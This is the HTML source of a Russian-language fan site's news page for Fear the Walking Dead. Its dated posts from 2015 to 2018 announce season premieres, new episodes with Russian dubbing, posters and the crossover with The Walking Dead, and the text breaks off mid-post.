<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>

<head>

<title>Бойтесь Ходячих Мертвецов (Fear the Walking Dead) | Русскоязычный сайт сериала</title>   
<link href="style.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon"> 
<link rel="apple-touch-icon" href="img/apple-touch-favicon.png">

<meta name="keywords" content="Бойтесь ходячих мертвецов, fear the walking dead, спин офф, spin off">
<meta http-equiv="content-type" content="text/html; charset=windows-1251">
<meta name="description" content="Сайт о сериале Бойтесь Ходячих Мертвецов (Fear the Walking Dead) - последние новости, смотреть онлайн, описание серий, саундтрек.">
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

<div class="background">
<div class="maintable">

<div class="logo">
</div>



<div class="menu">
<a href="index.html">Новости</a>
<a href="online.html">Смотреть</a>
<a href="serial.html">О сериале</a>
<a href="episode.html">Даты выхода</a>
<a href="actors.html">Актёры</a>
<a href="video.html">Видео</a>
<a href="gallery.html">Галерея</a>
<a href="soundtrack.html">Саундтрек</a>
</div>





<h1>Новости сериала</h1>





<div class="block">
<h2>Дата выхода 4 сезона</h2> 

<img src="images/4se.jpg" alt="Бойтесь ходячих мертвецов 4 сезон" class="imgblock">

На проходящем сейчас пресс-турне Ассоциации телевизионных критиков канал AMC сообщил, что премьера 4 сезона Бойтесь ходячих мертвецов состоится 16 апреля.<br>
В новом сезоне зрители увидят мир Мэдисон Кларк (Ким Диккенс) и её семьи через новые глаза - глаза Моргана Джонса (Ленни Джеймс), присоединившегося к сюжету из мира оригинальных Ходячих мертвецов.

<div class="data">
Дата: 14.01.2018
</div>
</div>





<div class="block">
<center>
<!--noindex-->
<script type="text/javascript" src="../banners.js"></script><!--/noindex-->
</center>
</div>




<div class="block">
<h2>Первые кадры из 4 сезона</h2> 

<a href="gallery/photos-4-sezon.html">
<img src="images/4ff.jpg" alt="Бойтесь ходячих мертвецов 4 сезон кадры" class="imgblock">
</a>

Издание Entertainment Weekly опубликовало первые <a href="gallery/photos-4-sezon.html">кадры из 4 сезона</a> Бойтесь ходячих мертвецов. Долгое, извилистое путешествие Ленни Джеймса продолжится в новом направлении, так как его персонаж покинет оригинальное шоу в конце восьмого сезона и перейдёт в Бойтесь ходячих мертвецов.<br>
Эндрю Чемблисс вместе с Йеном Голдбергом возьмут на себя обязанности шоураннеров в новом сезоне. 

<div class="data">
Дата: 10.01.2018
</div>
</div>





<div class="block">
<h2>Ленни Джеймс персонаж ожидаемого кроссовера</h2> 

<img src="images/lnc.jpg" alt="Ленни Джеймс" class="imgblock">

Сегодня вечером на шоу Talking Dead Крис Хардвик объявил, что Морган (Ленни Джеймс) присоединится к актёрскому составу Бойтесь ходячих метвецов в 4 сезоне, тем самым соединив два сериала о зомби апокалипсисе.

<div class="data">
Дата: 27.11.2017
</div>
</div>






<div class="block">
<h2>Финал сезона - Серия 15 и 16</h2> 

<a href="online/3-sezon-15-seriya.html">
<img src="images/e3-15.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 15 серия" class="imgblock">
</a>

Финальные <a href="online/3-sezon-15-seriya.html">пятнадцатая</a> и <a href="online/3-sezon-16-seriya.html">шестнадцатая</a> серии с русской озвучкой уже доступны для онлайн просмотра у нас на сайте.<br>
Ранее сериал был продлён на <a href="4-sezon.html">4 сезон</a>, он выйдет летом 2018 года и будет состоять из 16 серий. Вся информация о продолжении сериала будет появляться на сайте, следите за новостями!

<div class="data">
16.10.2017
</div>
</div>







<div class="block">
<h2>Серия 14 - El Matadero</h2> 

<a href="online/3-sezon-14-seriya.html">
<img src="images/e3-14.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 14 серия" class="imgblock">
</a>

<a href="online/3-sezon-14-seriya.html">Четырнадцатая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
В следующий понедельник - 16 октября выйдут заключительные <a href="online/3-sezon-15-seriya.html">пятнадцатая</a> и <a href="online/3-sezon-16-seriya.html">шестнадцатая</a> серии. К сериям доступен промо-ролик и краткие описания.

<div class="data">
9.10.2017
</div>
</div>





<div class="block">
<h2>Кроссовер с Ходячими мертвецами</h2> 

<img src="images/crs.jpg" alt="Ходячие мертвецы кроссовер" class="imgblock">

Исполнительный продюсер сериала Роберт Киркман на фестивале The New York Comic Con The Walking Dead объявил, что <a href="http://www.walking-dead.ru" target="_blank">Ходячие мертвецы</a> и Бойтесь ходячих мертвецов сойдутся в одной точке в следующем году. Персонаж одного из сериалов пересечётся с героями из другого, объединив два мира мёртвых вместе. Более подробная информация будет раскрыта в ближайшее время.

<div class="data">
Дата: 8.10.2017
</div>
</div>





<div class="block">
<h2>Серия 13 - This Land is Your Land</h2> 

<a href="online/3-sezon-13-seriya.html">
<img src="images/e3-13.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 13 серия" class="imgblock">
</a>

<a href="online/3-sezon-13-seriya.html">Тринадцатая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-14-seriya.html">Четырнадцатая серия</a> с названием El Matadero выйдет 9 октября, к серии доступен промо-ролик и краткое описание.

<div class="data">
2.10.2017
</div>
</div>





<div class="block">
<h2>Серия 12 - Brother’s Keeper</h2> 

<a href="online/3-sezon-12-seriya.html">
<img src="images/e3-12.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 12 серия" class="imgblock">
</a>

<a href="online/3-sezon-12-seriya.html">Двенадцатая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-13-seriya.html">Тринадцатая серия</a> с названием This Land is Your Land выйдет 2 октября, к серии доступен промо-ролик и краткое описание.

<div class="data">
25.09.2017
</div>
</div>





<div class="block">
<h2>Серия 11 - La Serpiente</h2> 

<a href="online/3-sezon-11-seriya.html">
<img src="images/e3-11.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 11 серия" class="imgblock">
</a>

<a href="online/3-sezon-11-seriya.html">Одиннадцатая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-12-seriya.html">Двенадцатая серия</a> с названием Brother’s Keeper выйдет 25 сентября, к серии доступен промо-ролик и краткое описание.

<div class="data">
18.09.2017
</div>
</div>





<div class="block">
<h2>Продолжение 3 сезона</h2> 

<a href="online/3-sezon-9-seriya.html">
<img src="images/e3-9.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 9 серия" class="imgblock">
</a>

Третий сезон сериала вернулся после перерыва, впереди будет ещё 8 серий, которые будут выходить по понедельникам.<br> Для просмотра доступны подряд сразу <a href="online/3-sezon-9-seriya.html">девятая</a> и <a href="online/3-sezon-10-seriya.html">десятая</a> серии с русской озвучкой.
<a href="online/3-sezon-11-seriya.html">Одиннадцатая серия</a> с названием La Serpiente выйдет 18 сентября, к серии доступен промо-ролик и краткое описание.
 
<div class="data">
11.09.2017
</div>
</div>





<div class="block">
<h2>Трейлер ко второй половине 3 сезона</h2> 

<a href="video/trailer-3-mid-sezon.html">
<img src="images/tr3m.jpg" alt="Бойтесь ходячих мертвецов 3 сезон трейлер" class="imgblock">
</a>

На проходящем сейчас в США фестивале Comic-Con 2017 был показан <a href="video/trailer-3-mid-sezon.html">официальный трейлер</a> ко второй половине 3 сезона Бойтесь ходячих мертвецов. Сериал вернётся 11 сентября с показом 9 и 10 серии в один день.
 
<div class="data">
21.07.2017
</div>
</div>





<div class="block">
<h2>Середина сезона. Серии 7 и 8</h2> 

<a href="online/3-sezon-7-seriya.html">
<img src="images/e3-7.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 7 серия" class="imgblock">
</a>

<a href="online/3-sezon-7-seriya.html">Седьмая</a> и <a href="online/3-sezon-8-seriya.html">восьмая</a> серии с русской озвучкой уже доступны для онлайн просмотра у нас на сайте.<br>
После этих серий сериал уходит на перерыв. Показ остальных восьми серий начнётся с 11 сентября. 

<div class="data">
10.07.2017
</div>
</div>






<div class="block">
<h2>Серия 6 - Red Dirt</h2> 

<a href="online/3-sezon-6-seriya.html">
<img src="images/e3-6.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 6 серия" class="imgblock">
</a>

<a href="online/3-sezon-6-seriya.html">Шестая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-7-seriya.html">Седьмая</a> и <a href="online/3-sezon-8-seriya.html">восьмая</a> серии выйдут в один день 10 июля, к сериям доступны промо-ролик и краткое описание.

<div class="data">
3.07.2017
</div>
</div>





<div class="block">
<h2>Серия 5 - Burning in Water, Drowning in Flame</h2> 

<a href="online/3-sezon-5-seriya.html">
<img src="images/e3-5.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 5 серия" class="imgblock">
</a>

<a href="online/3-sezon-5-seriya.html">Пятая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-6-seriya.html">Шестая серия</a> с названием Red Dirt выйдет 3 июля, к серии доступен промо-ролик и краткое описание.

<div class="data">
26.06.2017
</div>
</div>







<div class="block">
<h2>Серия 4 - 100</h2> 

<a href="online/3-sezon-4-seriya.html">
<img src="images/e3-4.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 4 серия" class="imgblock">
</a>

<a href="online/3-sezon-4-seriya.html">Четвёртая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-5-seriya.html">Пятая серия</a> с названием Burning in Water, Drowning in Flame выйдет 26 июня, к серии доступен промо-ролик и краткое описание.

<div class="data">
19.06.2017
</div>
</div>






<div class="block">
<h2>Серия 3 - Teotwawki</h2> 

<a href="online/3-sezon-3-seriya.html">
<img src="images/e3-3.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 3 серия" class="imgblock">
</a>

<a href="online/3-sezon-3-seriya.html">Третья серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/3-sezon-4-seriya.html">Четвёртая серия</a> с названием 100 выйдет 19 июня, к серии доступен промо-ролик и краткое описание.

<div class="data">
12.06.2017
</div>
</div>






<div class="block">
<h2>Премьера 3 сезона</h2> 

<a href="online/3-sezon-1-seriya.html">
<img src="images/e3-1.jpg" alt="Бойтесь ходячих мертвецов 3 сезон 1 серия" class="imgblock">
</a>

Сегодня состоялась долгожданная премьера 3 сезона Бойтесь ходячих мертвецов. Для просмотра доступны подряд сразу <a href="online/3-sezon-1-seriya.html">первая</a> и <a href="online/3-sezon-2-seriya.html">вторая</a> серии с русской озвучкой.<br>
<a href="online/3-sezon-3-seriya.html">Третья серия</a> с названием Teotwawki выйдет 12 июня, к серии доступен промо-ролик и краткое описание. 

<div class="data">
5.06.2017
</div>
</div>






<div class="block">
<h2>Постер к 3 сезону</h2> 

<a href="images/168.jpg" target="_blank">
<img src="images/3ps.jpg" alt="Бойтесь ходячих мертвецов 3 сезон постер" class="imgblock">
</a>

Сегодня AMC представили <a href="images/168.jpg" target="_blank">постер к 3 сезону</a> Бойтесь ходячих мертвецов. На постере показан зловещий слоган "Бойся того кем ты стал" над размазанным кровью лицом Ника, показывая, какие смертельные вещи могут произойти.<br>
В новом сезоне семьи будут объединены в тревожном и жестоком мире на границе США и Мексики. По мере того, как международные линии рухнули вместе с миром, герои должны попытаться восстановить не только общество, но и семью.

<div class="data">
18.04.2017
</div>
</div>









<div class="block">
<h2>Продление на 4 сезон</h2> 

<a href="4-sezon.html">
<img src="images/4sn.jpg" alt="Бойтесь ходячих мертвецов 3 сезон кадры" class="imgblock">
</a>

Канал AMC объявил сегодня, что в преддверии предстоящей премьеры нового сезона продлевают сериал на <a href="4-sezon.html">4 сезон</a>. Эндрю Чамблисс и Ян Голдберг будут выступать в качестве соавторов начиная с четвертого сезона. Кроме того, Скотт Гимпл, исполнительный продюсер и шоураннер оригинальных Ходячих мертвецов станет исполнительным продюсером Бойтесь ходячих мертвецов. Текущий шоураннер Дэйв Эриксон покидает свой пост третьего сезона, но по-прежнему будет фигурировать в качестве исполнительного продюсера. 

<div class="data">
14.04.2017
</div>
</div>






<div class="block">
<h2>Дата премьеры и новые кадры</h2> 

<a href="gallery/photos-3-sezon.html">
<img src="images/3pd.jpg" alt="Бойтесь ходячих мертвецов 3 сезон кадры" class="imgblock">
</a>

Официальная дата выхода 3 сезона намечена 5 июня. Первая половина сезона будет состоять из восьми серий, начиная с двух серий подряд 5 июня, и заканчивая финалом середины сезона также из двух серий 10 июля.<br>
Кроме того, были выпущены <a href="gallery/photos-3-sezon.html">новые кадры</a>, показывающие Стрэнда, Алисию и Офелию в новых окружениях и намекаюющие на новые опасности, с которыми они столкнутся, пытаясь пережить апокалипсис на границе США и Мексики. Также, на кадрах появляются неизвестные ранее и хорошо вооружённые люди. Они друзья или враги?

<div class="data">
3.04.2017
</div>
</div>








<div class="block">
<h2>Первые кадры и описание 3 сезона</h2> 

<a href="gallery/photos-3-sezon.html">
<img src="images/3se.jpg" alt="Бойтесь ходячих мертвецов 3 сезон кадры" class="imgblock">
</a>

Сегодня появились <a href="gallery/photos-3-sezon.html">первые кадры</a> и описание 3 сезона Бойтесь ходячих мертвецов. Сериал вернётся на экраны этим летом.<br>
Семьи будут собраны вместе на тревожной и полной насилия американо-мексиканской границе. Международные линии рухнули с последующим концом мира, они должны попытаться восстановить не только общество, но и семью.
Мэдисон воссоединяется с Трэвисом, её апокалиптическим партнёром, но Алисия была сломлена после того как убила Андреса. Нику и Люсиане устраивает засаду американская группа ополчения - пара избегает смерти, но Ник уже не чувствует себя бессмертным.<br>
Приходя в себя как эмоционально, так и физически, Стрэнд имеет свои виды на освоение новой мировой валюты, а пленение Офелии проверит её способность выживать и проверить, сможет ли она стать такой же как её отец.

<div class="data">
1.03.2017
</div>
</div>






<div class="block">
<h2>Новые веб-эпизоды</h2> 

<a href="web-episodes-2.html">
<img src="images/we2.jpg" alt="Бойтесь ходячих мертвецов 3 сезон веб эпизоды" class="imgblock">
</a>

Канал AMC запускает новую серию <a href="web-episodes-2.html">веб-эпизодов</a> Бойтесь ходячих мертвецов, всего будет 16 эпизодов, они будут выходить раз в неделю во время показа оригинальных Ходячих мертвецов. По сюжету внушающий страх выживший соглашается помочь травмированной женщине в обмен на убежище в мире апокалипсиса. 

<div class="data">
17.10.2016
</div>
</div>






<div class="block">
<h2>Финал сезона - Серия 14 и 15</h2> 

<a href="online/2-sezon-14-seriya.html">
<img src="images/e2-14.jpg" alt="Бойтесь ходячих мертвецов 2 сезон финал" class="imgblock">
</a>

Финальные <a href="online/2-sezon-14-seriya.html">четырнадцатая</a> и <a href="online/2-sezon-15-seriya.html">пятнадцатая</a> серии с профессиональной русской озвучкой уже доступны для онлайн просмотра у нас на сайте.<br>
Сериал был продлён на <a href="3-sezon.html">3 сезон</a>, он выйдет весной 2017 года и будет состоять из 16 серий. Вся информация о продолжении сериала будет появляться на сайте, следите за новостями!

<div class="data">
3.10.2016
</div>
</div>







<div class="block">
<h2>Серия 13 - Date of Death</h2> 

<a href="online/2-sezon-13-seriya.html">
<img src="images/e2-13.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 13 серия" class="imgblock">
</a>

<a href="online/2-sezon-13-seriya.html">Тринадцатая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
Финальные <a href="online/2-sezon-14-seriya.html">четырнадцатая </a> и <a href="online/2-sezon-15-seriya.html">пятнадцатая</a> серии выйдут сразу в один день - 3 октября, к серииям доступен промо-ролик и краткое описание.

<div class="data">
26.09.2016
</div>
</div>








<div class="block">
<h2>Серия 12 - Pillar of Salt</h2> 

<a href="online/2-sezon-12-seriya.html">
<img src="images/e2-12.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 12 серия" class="imgblock">
</a>

<a href="online/2-sezon-12-seriya.html">Двенадцатая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-13-seriya.html">Тринадцатая серия</a> с названием Date of Death выйдет 26 сентября, к серии доступен промо-ролик и краткое описание.

<div class="data">
19.09.2016
</div>
</div>








<div class="block">
<h2>Серия 11 - Pablo & Jessica</h2> 

<a href="online/2-sezon-11-seriya.html">
<img src="images/e2-11.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 11 серия" class="imgblock">
</a>

<a href="online/2-sezon-11-seriya.html">Одиннадцатая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-12-seriya.html">Двенадцатая серия</a> с названием Pillar of Salt выйдет 19 сентября, к серии доступен промо-ролик и краткое описание.

<div class="data">
12.09.2016
</div>
</div>








<div class="block">
<h2>Серия 10 - Do Not Disturb</h2> 

<a href="online/2-sezon-10-seriya.html">
<img src="images/e2-10.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 10 серия" class="imgblock">
</a>

<a href="online/2-sezon-10-seriya.html">Десятая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-11-seriya.html">Одиннадцатая серия</a> с названием Pablo & Jessica выйдет 12 сентября, к серии доступен промо-ролик и краткое описание.

<div class="data">
5.09.2016
</div>
</div>








<div class="block">
<h2>Серия 9 - Los Muertos</h2> 

<a href="online/2-sezon-9-seriya.html">
<img src="images/e2-9.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 9 серия" class="imgblock">
</a>

<a href="online/2-sezon-9-seriya.html">Девятая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-10-seriya.html">Десятая серия</a> с названием Do Not Disturb выйдет 5 сентября, к серии доступен промо-ролик и краткое описание.

<div class="data">
29.08.2016
</div>
</div>







<div class="block">
<h2>Серия 8 - Grotesque</h2> 

<a href="online/2-sezon-8-seriya.html">
<img src="images/e2-8.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 8 серия" class="imgblock">
</a>

Второй сезон сериала вернулся после перерыва, впереди будет ещё 8 серий, которые будут выходить по понедельникам.<br> <a href="online/2-sezon-8-seriya.html">Восьмая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-9-seriya.html">Девятая серия</a> с названием Los Muertos выйдет 29 августа, к серии доступен промо-ролик и краткое описание.

<div class="data">
22.08.2016
</div>
</div>








<div class="block">
<h2>Постер для Comic-Con и новые кадры</h2> 

<a href="images/cc2s.jpg" target="_blank">
<img src="images/cc2.jpg" alt="Бойтесь ходячих мертвецов 2 сезон постер" class="imgblock">
</a>

Сегодня AMC представили зловещий <a href="images/cc2s.jpg" target="_blank">постер</a> со слоганом "Смерть не знает границ" для выставки Comic-Con, а также два первых промо-кадра из второй половины второго сезона: <a href="images/159.jpg" target="_blank">кадр 1</a>, <a href="images/160.jpg" target="_blank">кадр 2</a>

<div class="data">
11.07.2016
</div>
</div>






<div class="block">
<h2>Серия 7 - Shiva</h2> 

<a href="online/2-sezon-7-seriya.html">
<img src="images/e2-7.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 7 серия" class="imgblock">
</a>

<a href="online/2-sezon-7-seriya.html">Седьмая серия</a> с оригинальной озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
После этой серии сериал уходит на перерыв, по возвращению с перерыва будет показано ещё восемь серий.<br> Следующая, <a href="online/2-sezon-8-seriya.html">восьмая серия</a> выйдет 22 августа, к серии доступен промо-ролик и краткое описание.

<div class="data">
23.05.2016
</div>
</div>







<div class="block">
<h2>Серия 6 - Sicut Cervus</h2> 

<a href="online/2-sezon-6-seriya.html">
<img src="images/e2-6.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 6 серия" class="imgblock">
</a>

<a href="online/2-sezon-6-seriya.html">Шестая серия</a> с русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-7-seriya.html">Седьмая серия</a> с названием Shiva выйдет 23 мая, к серии доступен промо-ролик и краткое описание.

<div class="data">
16.05.2016
</div>
</div>







<div class="block">
<h2>Серия 5 - Captive</h2> 

<a href="online/2-sezon-5-seriya.html">
<img src="images/e2-5.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 5 серия" class="imgblock">
</a>

<a href="online/2-sezon-5-seriya.html">Пятая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-6-seriya.html">Шестая серия</a> с названием Sicut Cervus выйдет 16 мая, к серии доступен промо-ролик и краткое описание.

<div class="data">
9.05.2016
</div>
</div>






<div class="block">
<h2>Серия 4 - Blood In The Streets</h2> 

<a href="online/2-sezon-4-seriya.html">
<img src="images/e2-4.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 4 серия" class="imgblock">
</a>

<a href="online/2-sezon-4-seriya.html">Четвёртая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-5-seriya.html">Пятая серия</a> с названием Captive выйдет 9 мая, к серии доступен промо-ролик и краткое описание.

<div class="data">
2.05.2016
</div>
</div>







<div class="block">
<h2>Серия 3 - Ouroboros</h2> 

<a href="online/2-sezon-3-seriya.html">
<img src="images/e2-3.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 3 серия" class="imgblock">
</a>

<a href="online/2-sezon-3-seriya.html">Третья серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-4-seriya.html">Четвёртая серия</a> с названием Blood In The Streets выйдет 2 мая, к серии доступен промо-ролик и краткое описание.

<div class="data">
25.04.2016
</div>
</div>







<div class="block">
<h2>Серия 2 - We All Fall Down</h2> 

<a href="online/2-sezon-2-seriya.html">
<img src="images/e2-2.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 2 серия" class="imgblock">
</a>

<a href="online/2-sezon-2-seriya.html">Вторая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br>
<a href="online/2-sezon-3-seriya.html">Третья серия</a> с названием Ouroboros выйдет 25 апреля, к серии доступен промо-ролик и краткое описание.

<div class="data">
18.04.2016
</div>
</div>








<div class="block">
<h2>Продление на 3 сезон</h2> 

<a href="3-sezon.html">
<img src="images/3sn.jpg" alt="Бойтесь ходячих мертвецов 3 сезон" class="imgblock">
</a>

Сегодня канал AMC официально объявили о продлении сериала Бойтесь ходячих мертвецов на <a href="3-sezon.html">3 сезон</a>. Новый сезон выйдет в 2017 году и будет состоять уже из 16 серий.

<div class="data">
15.04.2016
</div>
</div>






<div class="block">
<h2>Премьера 2 сезона</h2> 

<a href="online/2-sezon-1-seriya.html">
<img src="images/e2-1.jpg" alt="Бойтесь ходячих мертвецов 2 сезон 1 серия" class="imgblock">
</a>

Сегодня состоялась долгожданная премьера второго сезона Бойтесь ходячих мертвецов. <a href="online/2-sezon-1-seriya.html">Первая серия</a> с названием Monster уже доступна для онлайн просмотра на сайте.<br>
<a href="online/2-sezon-2-seriya.html">Вторая серия</a> с названием We All Fall Down выйдет 18 апреля, к серии доступен промо-ролик и краткое описание.

<div class="data">
11.04.2016
</div>
</div>







<div class="block">
<h2>Отрывок из 1 серии</h2> 

<a href="video/sneak-peek-4.html">
<img src="images/1sp.jpg" alt="Бойтесь ходячих мертвецов 2 сезон отрывок" class="imgblock">
</a>

До выхода второго сезона осталось совсем немного, премьера состоится в этот понедельник. Предлагаем вашему вниманию <a href="video/sneak-peek-4.html">отрывок из первой серии</a> нового сезона с названием Monster.<br>
Также в галерею добавлены <a href="gallery/promo-photos-2-sezon.html">новые промо</a> со всеми основными героями сериала. 
<div class="data">
6.04.2016
</div>
</div>






<div class="block">
<h2>Промо-фото и кадры 2 сезона</h2> 

<a href="gallery/photos-2-sezon.html">
<img src="images/2sf.jpg" alt="Бойтесь ходячих мертвецов 2 сезон промо" class="imgblock">
</a>

Менее чем через месяц состоится премьера второго сезона сериала Бойтесь ходячих мертвецов. Предлагаем вашему вниманию шестнадцать <a href="gallery/photos-2-sezon.html">новых кадров</a> из второго сезона и тринадцать <a href="gallery/promo-photos-2-sezon.html">промо-фотографий</a> с основными героями сериала. Что ждёт Трэвиса, Мэдисон, Даниэля и остальную часть выживших на яхте Стрэнда узнаем 11 апреля.

<div class="data">
11.03.2016
</div>
</div>







<div class="block">
<h2>Постер 2 сезона</h2> 

<a href="images/fp2.jpg" target="_blank">
<img src="images/fwdp2.jpg" alt="Бойтесь ходячих мертвецов 2 сезон" class="imgblock">
</a>

Сегодня AMC представили официальный <a href="images/fp2.jpg" target="_blank">постер для второго сезона</a> Бойтесь ходячих мертвецов. Постер со слоганом "Безопасной гавани нет" изображает яхту Стрэнда с названием Эбигейл на которой главные герои хотели укрыться от начавшегося апокалипсиса в Тихом океане.

<div class="data">
4.03.2016
</div>
</div>






<div class="block">
<h2>Дата выхода и первый кадр</h2> 

<a href="images/2f1.jpg" target="_blank">
<img src="images/2f.jpg" alt="Бойтесь ходячих мертвецов 2 сезон" class="imgblock">
</a>

Сегодня на пресс-туре Ассоциации Телевизионных Критиков канал AMC сообщил точную дату выхода 2 сезона - <b>11 апреля</b> этого года, а также показали первый <a href="images/2f1.jpg" target="_blank">кадр из нового сезона</a>. Второй сезон будет состоять из 15 серий и будет разбит на две части, первые семь серий будут показаны начиная с апреля, а остальные восемь выйдут позднее в этом же году.<br>
Производство 2 сезона началось в прошлом месяце на полуострове Байя в Мексике в Baja Studios, местом для самых больших океанических съёмок в последние годы.

<div class="data">
9.01.2016
</div>
</div>





<div class="block">
<h2>Начало производства 2 сезона</h2> 

<a href="2-sezon.html">
<img src="images/ps2.jpg" alt="Бойтесь ходячих мертвецов 2 сезон" class="imgblock">
</a>

Канал AMC объявил о начале производства 2 сезона Бойтесь ходячих мертвецов. Сериал вернётся с новыми сериями весной 2016 года.<br>
Мэдисон, Трэвис и их семьи попадают во временное убежище Стэнда с видом на Тихий океан. Гражданские беспорядки продолжают расти, а мёртвые заполняют Лос-Анджелес, Стэнд готовится бежать к "Эбигейл" - его большой яхте пришвартованной в открытом море.

<div class="data">
4.12.2015
</div>
</div>





<div class="block">
<h2>Серия 6 - The Good Man</h2> 

<a href="online/1-sezon-6-seriya.html">
<img src="images/e6.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 6 серия" class="imgblock">
</a>

Финальная <a href="online/1-sezon-6-seriya.html">шестая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте.<br> 
Сериал уже продлён на <a href="2-sezon.html">2 сезон</a>, который будет состоять уже из 15 серий и выйдет летом 2016 года.<br>
Также вышел первый <a href="web-episodes.html">веб эпизод</a> к сериалу. Всего их будет шестнадцать и выходить они будут каждый понедельник.

<div class="data">
5.10.2015
</div>
</div>




<div class="block">
<h2>Веб эпизоды</h2> 

<img src="images/we.jpg" alt="Бойтесь ходячих мертвецов веб эпизоды" class="imgblock">

AMC анонсировали веб-эпизоды к сериалу, они получили название Бойтесь ходячих мертвецов: Рейс 462. Эпизоды рассказывают историю группы пассажиров на борту коммерческого рейса во время самых ранних вспышек инфекции. По ходу событий, самолёт и жизнь всех пассажиров ставятся под угрозу, когда на борту обнаруживается зараженный турист.<br>
Всего будет 16 эпизодов, первый выйдет 5 октября, последующие эпизоды продолжительностью около минуты будут выходить каждый понедельник во время показа 6 сезона Ходячих мертвецов. Один из героев эпизодов присоединится к актёрскому составу Бойтесь ходячих мертвецов во 2 сезоне.

<div class="data">
28.09.2015
</div>
</div>



<div class="block">
<h2>Серия 5 - Cobalt</h2> 

<a href="online/1-sezon-5-seriya.html">
<img src="images/e5.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 5 серия" class="imgblock">
</a>

<a href="online/1-sezon-5-seriya.html">Пятая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте. 
Финальная <a href="online/1-sezon-6-seriya.html">шестая серия</a> с названием The Good Man выйдет 5 октября, смотрите промо-видео к ней. 

<div class="data">
27.09.2015
</div>
</div>





<div class="block">
<h2>Серия 4 - Not Fade Away</h2> 

<a href="online/1-sezon-4-seriya.html">
<img src="images/e4.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 4 серия" class="imgblock">
</a>

<a href="online/1-sezon-4-seriya.html">Четвёртая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте. 
<a href="online/1-sezon-5-seriya.html">Пятая серия</a> с названием Cobalt выйдет 28 сентября, смотрите промо-видео к ней. 

<div class="data">
21.09.2015
</div>
</div>




<div class="block">
<h2>Серия 3 - The Dog</h2> 

<a href="online/1-sezon-3-seriya.html">
<img src="images/e3.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 3 серия" class="imgblock">
</a>

<a href="online/1-sezon-3-seriya.html">Третья серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте. 
<a href="online/1-sezon-4-seriya.html">Четвёртая серия</a> с названием Not Fade Away выйдет 21 сентября, смотрите промо-видео к ней. 

<div class="data">
14.09.2015
</div>
</div>





<div class="block">
<h2>Серия 2 - So Close, Yet so Far</h2> 

<a href="online/1-sezon-2-seriya.html">
<img src="images/e2.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 2 серия" class="imgblock">
</a>

<a href="online/1-sezon-2-seriya.html">Вторая серия</a> с профессиональной русской озвучкой уже доступна для онлайн просмотра у нас на сайте. 
<a href="online/1-sezon-3-seriya.html">Третья серия</a> с названием The Dog выйдет 14 сентября, смотрите промо-видео к ней. 

<div class="data">
31.08.2015
</div>
</div>





<div class="block">
<h2>Рейтинги первой серии</h2> 

<a href="online/1-sezon-1-seriya.html">
